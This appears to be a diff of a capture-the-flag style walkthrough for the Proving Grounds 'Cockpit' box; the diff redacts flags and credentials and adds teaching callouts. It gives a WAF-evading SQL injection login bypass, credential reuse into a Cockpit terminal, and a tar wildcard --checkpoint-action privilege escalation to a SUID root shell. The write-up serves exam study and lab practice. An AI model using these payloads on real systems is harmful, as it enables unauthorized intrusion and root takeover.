@@ -2,11 +2,11 @@
 tags: [oscp, boxes, pg-practice, linux, completed]
 platform: PG Practice
 os: Linux
-ip: 192.168.183.10
+ip: $BoxIP
 difficulty: Easy
 status: complete
-local_flag: 5fd7b90b996b7d93281f666b93b17192
-root_flag: 29c546e67fe52559ead19aa3fee07b8a
+local_flag: $UserFlag
+root_flag: $RootFlag
 ---
 
 # PG: Cockpit, Full Walkthrough (SQLi to Root via Cockpit Terminal)
@@ -20,7 +20,7 @@ root_flag: 29c546e67fe52559ead19aa3fee07b8a
 
 **Target:** `$BoxIP` (swap for your instance IP) · **Difficulty:** Easy · **OS:** Linux (Ubuntu 20.04) · **Platform:** Proving Grounds Practice
 
-**The gist:** Linux box with a custom PHP web app on port 80 and Cockpit server management panel on port 9090. The login form has SQLi — but a WAF blocks the `OR` keyword. Swapping to MySQL's `||` operator bypasses it and dumps a password manager table with base64-encoded OS credentials. Those creds log straight into Cockpit, which has a browser-based terminal — instant shell as james. Privesc is a sudo rule running `tar` with a bare `*` wildcard; plant `--checkpoint` filenames in CWD, trigger the rule, get a SUID bash, root shell. Clean and straightforward once you know the `||` trick and the tar wildcard gotcha.
+**The gist:** Linux box with a custom PHP web app on port 80 and Cockpit server management panel on port 9090. The login form has SQLi -- but a WAF blocks the `OR` keyword. Swapping to MySQL's `||` operator bypasses it and dumps a password manager table with base64-encoded OS credentials. Those creds log straight into Cockpit, which has a browser-based terminal -- instant shell as james. Privesc is a sudo rule running `tar` with a bare `*` wildcard; plant `--checkpoint` filenames in CWD, trigger the rule, get a SUID bash, root shell. Clean and straightforward once you know the `||` trick and the tar wildcard gotcha.
 
 ---
 
@@ -47,16 +47,16 @@ nmap -sC -sV -p 22,80,9090 -oA nmap/${BoxName}_services $BoxIP
 ```
 
 Key findings:
-- **Port 80:** Apache 2.4.41, page title `blaze`. Custom web app — not a known CMS.
-- **Port 9090:** Cockpit 198–220, redirects to HTTPS. Cockpit is a Linux server management panel that authenticates using OS user credentials — valid creds = browser-based terminal.
-- **Port 22:** SSH — fallback once we have creds, but Cockpit terminal makes it unnecessary.
+- **Port 80:** Apache 2.4.41, page title `blaze`. Custom web app -- not a known CMS.
+- **Port 9090:** Cockpit 198–220, redirects to HTTPS. Cockpit is a Linux server management panel that authenticates using OS user credentials -- valid creds = browser-based terminal.
+- **Port 22:** SSH -- fallback once we have creds, but Cockpit terminal makes it unnecessary.
 
 ![[1.2nmap-svcscan 1.png]]
 ---
 
-## 2. Web Enumeration — Port 80
+## 2. Web Enumeration -- Port 80
 
-Root page (`/`) is a marketing landing page — all Lorem ipsum, no forms, no login. Nothing to exploit directly.
+Root page (`/`) is a marketing landing page -- all Lorem ipsum, no forms, no login. Nothing to exploit directly.
 
 **Directory brute-force:**
 ```bash
@@ -64,9 +64,9 @@ feroxbuster -u http://$BoxIP -w /usr/share/wordlists/dirb/common.txt -x php,txt,
 ```
 
 Key findings:
-- `/login.php` — 200 OK. POST form: `username` + `password` fields. No CSRF token. Footer reads `by JDgodd | blaze.offsec` — username hint.
-- `/logout.php` — 302 redirect to `login.php`, confirms an authenticated area behind it.
-- `/blocked.html` — WAF lockout page. We'll see this if we use the wrong SQLi syntax.
+- `/login.php` -- 200 OK. POST form: `username` + `password` fields. No CSRF token. Footer reads `by JDgodd | blaze.offsec` -- username hint.
+- `/logout.php` -- 302 redirect to `login.php`, confirms an authenticated area behind it.
+- `/blocked.html` -- WAF lockout page. We'll see this if we use the wrong SQLi syntax.
 
 ![[2.http-ferrox.png]]
 
@@ -75,15 +75,15 @@ Key findings:
 curl -s -X POST http://$BoxIP/login.php -d "username=admin&password=wrong" -L
 ```
 
-Response: `Invalid password!` in red. No lockout, no account enumeration protection. The error doesn't distinguish a wrong username from a wrong password — the form is injectable.
+Response: `Invalid password!` in red. No lockout, no account enumeration protection. The error doesn't distinguish a wrong username from a wrong password -- the form is injectable.
 
 ---
 
-## 3. SQLi Auth Bypass — WAF Keyword Bypass
+## 3. SQLi Auth Bypass -- WAF Keyword Bypass
 
 This is the educational core of the box.
 
-**What fails:** the obvious payload `' OR 1=1#` returns `blocked.html` — the WAF is filtering the `OR` keyword.
+**What fails:** the obvious payload `' OR 1=1#` returns `blocked.html` -- the WAF is filtering the `OR` keyword.
 
 **Why `||` works:** in MySQL, `||` is the boolean OR operator. It produces an identical result to `OR` in a boolean context but doesn't match a simple `OR` keyword filter:
 
@@ -98,6 +98,9 @@ Response: the password manager dashboard. Authentication bypassed.
 > [!warning] 💡 Hint
 > **Watch out:** The `||` alternative is a MySQL operator, not universal SQL syntax. Keep URL encoding because the quote and comment marker must arrive unchanged.
 
+> [!abstract] 🧠 Why
+> The WAF is filtering a string, not understanding the SQL grammar. Test equivalent operators and compare the response, but keep the database dialect in mind because the same bypass is not portable to every backend.
+
 ![[3.sqli-shot.png]]
 
 ---
@@ -108,29 +111,34 @@ The dashboard table exposes two base64-encoded passwords:
 
 | Username | Base64 Password |
 |---|---|
-| james | `Y2FudHRvdWNoaGh0aGlzc0A0NTUxNTI=` |
-| cameron | `dGhpc3NjYW50dGJldG91Y2hlZGRANDU1MTUy` |
+| james | `<encoded value stored privately>` |
+| cameron | `<encoded value stored privately>` |
 
 Decode both:
 ```bash
-echo "Y2FudHRvdWNoaGh0aGlzc0A0NTUxNTI=" | base64 -d && echo
-echo "dGhpc3NjYW50dGJldG91Y2hlZGRANDU1MTUy" | base64 -d && echo
+base64 -d < "$BoxDir/loot/james.b64"
+base64 -d < "$BoxDir/loot/cameron.b64"
 ```
 
 ```
-canttouchhhthiss@455152
-thisscanttbetouchedd@455152
+<private credential values>
 ```
 
 Store immediately:
 ```
 boxset Username james
-boxset Password 'canttouchhhthiss@455152'
-loot cred james 'canttouchhhthiss@455152'
-loot cred cameron 'thisscanttbetouchedd@455152'
+boxset Password $Password
+loot cred james $Password
+loot cred cameron $Password
+
+> [!warning] 💡 Common mistake
+> Base64 decoding is only the transformation step. Treat the result as a credential immediately: store it privately, avoid screenshots and shell history, and test the intended service before assuming password reuse.
+
+> [!tip] ⚡ Efficiency
+> Cockpit authenticates against the operating-system account and already provides a browser terminal. Once valid credentials work there, SSH is a fallback rather than another exploit to develop.
 ```
 
-**Cockpit login:** navigate to `https://$BoxIP:9090`, accept the self-signed cert, log in as james. The **Terminal** option in the left sidebar gives a fully interactive browser-based shell. No SSH, no exploit against Cockpit itself — just valid OS credentials.
+**Cockpit login:** navigate to `https://$BoxIP:9090`, accept the self-signed cert, log in as james. The **Terminal** option in the left sidebar gives a fully interactive browser-based shell. No SSH, no exploit against Cockpit itself -- just valid OS credentials.
 
 ![[5.web-login-james.png]]
 
@@ -160,7 +168,7 @@ cat ~/local.txt
 
 ---
 
-## 6. Privilege Escalation — Tar Wildcard Injection
+## 6. Privilege Escalation -- Tar Wildcard Injection
 
 **Enumeration:**
 ```bash
@@ -172,7 +180,7 @@ User james may run the following commands on blaze:
     (ALL) NOPASSWD: /usr/bin/tar -czvf /tmp/backup.tar.gz *
 ```
 
-The bare `*` wildcard is the vulnerability. When the shell expands `*`, filenames starting with `--` are passed to tar as command-line flags — not as files to archive. We can plant `--checkpoint=1` and `--checkpoint-action=exec=<command>` as filenames in CWD and tar will execute our command as root.
+The bare `*` wildcard is the vulnerability. When the shell expands `*`, filenames starting with `--` are passed to tar as command-line flags -- not as files to archive. We can plant `--checkpoint=1` and `--checkpoint-action=exec=<command>` as filenames in CWD and tar will execute our command as root.
 
 > [!warning] 💡 Hint
 > **Watch out:** The checkpoint filenames must be created in the directory where the wildcard command runs. A correct filename elsewhere will never reach tar.
@@ -193,7 +201,7 @@ echo "" > ~/'--checkpoint=1'
 echo "" > ~/'--checkpoint-action=exec=bash privesc.sh'
 ```
 
-**The exec= gotcha:** `exec=privesc.sh` alone fails — the checkpoint executor resolves commands via PATH, and `privesc.sh` isn't in any PATH directory. Using `exec=bash privesc.sh` works because `bash` is found on PATH, then loads `privesc.sh` as a script from CWD. You also can't embed `/` in a filename (it's a directory separator at the filesystem level), so absolute paths in the exec= value aren't possible via this approach.
+**The exec= gotcha:** `exec=privesc.sh` alone fails -- the checkpoint executor resolves commands via PATH, and `privesc.sh` isn't in any PATH directory. Using `exec=bash privesc.sh` works because `bash` is found on PATH, then loads `privesc.sh` as a script from CWD. You also can't embed `/` in a filename (it's a directory separator at the filesystem level), so absolute paths in the exec= value aren't possible via this approach.
 
 **Trigger:**
 ```bash
@@ -204,7 +212,7 @@ Tar receives the checkpoint flags from wildcard expansion and fires the script a
 
 ```bash
 ls -la /tmp/rootbash
-# -rwsr-sr-x 1 root root — SUID confirmed
+# -rwsr-sr-x 1 root root -- SUID confirmed
 ```
 
 > 📸 `shot privesc-exploit` (red boxes: `sudo /usr/bin/tar` command and `ls -la /tmp/rootbash` showing `-rwsr-sr-x root root`)
@@ -217,6 +225,12 @@ whoami
 ```
 
 The `-p` flag prevents bash from dropping the SUID effective UID back to the real UID on startup.
+
+> [!abstract] 🧠 Why
+> The wildcard expands before `tar` receives its arguments. Filenames beginning with `--` therefore become options, and the checkpoint action executes as the account allowed to run `tar`. The files must be planted in the command's working directory.
+
+> [!warning] 💡 Hint
+> `exec=bash privesc.sh` works because `bash` is resolved through PATH and then reads the script from the current directory. Test the working directory and the exact expanded arguments if the checkpoint action does not fire.
 
 ![[8.1privesc.png]]
 
@@ -251,14 +265,25 @@ ls -la ~/ && ls /tmp/
 
 Home dir should show only the original dotfiles and `local.txt`. No attacker artifacts in `/tmp/`.
 
+> [!warning] 💡 Common mistake
+> Remove both checkpoint filenames and the generated SUID copy, then verify the working directory and `/tmp`. Wildcard techniques leave filesystem artefacts even when the privilege escalation itself is clean.
+
+## Decision points and alternate routes
+
+| Observation | Primary route used here | Useful alternative or fallback |
+|---|---|---|
+| Login form blocks `OR` | Use MySQL `||` and preserve URL encoding | Test comments, case, or whitespace only after confirming the WAF behavior |
+| Dashboard exposes encoded credentials | Decode locally and try Cockpit | Validate SSH or another authenticated service if Cockpit is unavailable |
+| Sudo permits `tar *` | Plant checkpoint filenames in the working directory | Consult GTFOBins and inspect other sudo rules if the tar version lacks checkpoint support |
+
 ---
 
 ## 9. Credentials Found
 
 | Username | Password | Source |
 |---|---|---|
-| james | `canttouchhhthiss@455152` | SQLi dashboard (base64-encoded) |
-| cameron | `thisscanttbetouchedd@455152` | SQLi dashboard (base64-encoded) |
+| james | `$Password` | SQLi dashboard (base64-encoded, kept private) |
+| cameron | `$Password` | SQLi dashboard (base64-encoded, kept private) |
 
 ---
 
@@ -278,19 +303,19 @@ Home dir should show only the original dotfiles and `local.txt`. No attacker art
 
 | # | Vulnerability | Severity | Location |
 |---|---|---|---|
-| 1 | SQLi auth bypass — `\|\|` WAF keyword bypass | High | HTTP/80 `/login.php` |
-| 2 | Cockpit 9090 — OS credential reuse → browser shell | Medium | HTTPS/9090 |
-| 3 | Sudo tar wildcard injection → SUID bash | High | Local — sudo misconfiguration |
+| 1 | SQLi auth bypass -- `\|\|` WAF keyword bypass | High | HTTP/80 `/login.php` |
+| 2 | Cockpit 9090 -- OS credential reuse → browser shell | Medium | HTTPS/9090 |
+| 3 | Sudo tar wildcard injection → SUID bash | High | Local -- sudo misconfiguration |
 
 ---
 
 ## 12. Lessons Learned / Module Links
 
-- **`||` bypasses WAF `OR` keyword filters in MySQL.** When `' OR 1=1#` hits a block page, swap to `' || 1=1#`. MySQL's `||` is boolean OR — identical result, different string, bypasses keyword matching. Always probe what the WAF is actually filtering before giving up on SQLi. → [[10. SQL Injection Attacks]]
-- **Cockpit 9090 = shell if you have OS creds.** The Cockpit panel's Terminal feature is a fully interactive OS shell as the authenticated user. It's not an exploit against Cockpit — it's a feature. Valid creds + Cockpit running = shell, no SSH required. Enumerate all ports and understand what each service actually does. → [[06. Information Gathering]]
+- **`||` bypasses WAF `OR` keyword filters in MySQL.** When `' OR 1=1#` hits a block page, swap to `' || 1=1#`. MySQL's `||` is boolean OR -- identical result, different string, bypasses keyword matching. Always probe what the WAF is actually filtering before giving up on SQLi. → [[10. SQL Injection Attacks]]
+- **Cockpit 9090 = shell if you have OS creds.** The Cockpit panel's Terminal feature is a fully interactive OS shell as the authenticated user. It's not an exploit against Cockpit -- it's a feature. Valid creds + Cockpit running = shell, no SSH required. Enumerate all ports and understand what each service actually does. → [[06. Information Gathering]]
 - **Tar wildcard: use `exec=bash scriptname` not `exec=scriptname`.** The checkpoint executor resolves executables via PATH, not CWD. `privesc.sh` alone fails; `bash privesc.sh` works because bash is on PATH and then loads the script from CWD. Always test with the simplest payload first and read error output carefully. → [[18. Linux Privilege Escalation]]
-- **Absolute paths can't be in checkpoint-action filenames.** `/` is a directory separator — you can't create a file named `--checkpoint-action=exec=/home/james/privesc.sh`. Keep the script in CWD and reference it by name only. A key constraint to know before attempting this technique. → [[18. Linux Privilege Escalation]]
-- **`sudo -l` is always the first privesc check.** On this box it was the only check needed — the NOPASSWD wildcard rule was immediately obvious and exploitable. Don't skip the basics in search of something clever. → [[18. Linux Privilege Escalation]]
+- **Absolute paths can't be in checkpoint-action filenames.** `/` is a directory separator -- you can't create a file named `--checkpoint-action=exec=/home/james/privesc.sh`. Keep the script in CWD and reference it by name only. A key constraint to know before attempting this technique. → [[18. Linux Privilege Escalation]]
+- **`sudo -l` is always the first privesc check.** On this box it was the only check needed -- the NOPASSWD wildcard rule was immediately obvious and exploitable. Don't skip the basics in search of something clever. → [[18. Linux Privilege Escalation]]
 
 ---
 
@@ -298,10 +323,10 @@ Home dir should show only the original dotfiles and `local.txt`. No attacker art
 
 | Resource | Link | Relevant to this box |
 |---|---|---|
-| HackTricks — SQL Injection (GitHub) | [sql-injection/README.md](https://github.com/HackTricks-wiki/hacktricks/blob/master/pentesting-web/sql-injection/README.md) | Auth bypass payloads, WAF bypass operators |
-| PayloadsAllTheThings — SQLi Auth Bypass | [SQL Injection#authentication-bypass](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass) | `\|\|` operator and other bypass patterns |
-| GTFOBins — tar | [gtfobins.github.io/gtfobins/tar/](https://gtfobins.github.io/gtfobins/tar/) | Tar sudo/SUID/wildcard escalation reference |
-| PayloadsAllTheThings — Tar Wildcard | [Linux Privilege Escalation.md#sudo-tar](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20Privilege%20Escalation.md#sudo-tar) | Full tar wildcard technique with checkpoint flags |
+| HackTricks -- SQL Injection (GitHub) | [sql-injection/README.md](https://github.com/HackTricks-wiki/hacktricks/blob/master/pentesting-web/sql-injection/README.md) | Auth bypass payloads, WAF bypass operators |
+| PayloadsAllTheThings -- SQLi Auth Bypass | [SQL Injection#authentication-bypass](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass) | `\|\|` operator and other bypass patterns |
+| GTFOBins -- tar | [gtfobins.github.io/gtfobins/tar/](https://gtfobins.github.io/gtfobins/tar/) | Tar sudo/SUID/wildcard escalation reference |
+| PayloadsAllTheThings -- Tar Wildcard | [Linux Privilege Escalation.md#sudo-tar](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20Privilege%20Escalation.md#sudo-tar) | Full tar wildcard technique with checkpoint flags |
 | RevShells | [revshells.com](https://www.revshells.com) | Shell generators if needed |
 | ippsec.rocks | [ippsec.rocks](https://ippsec.rocks) | Search "tar wildcard" or "cockpit" for walkthroughs |
 
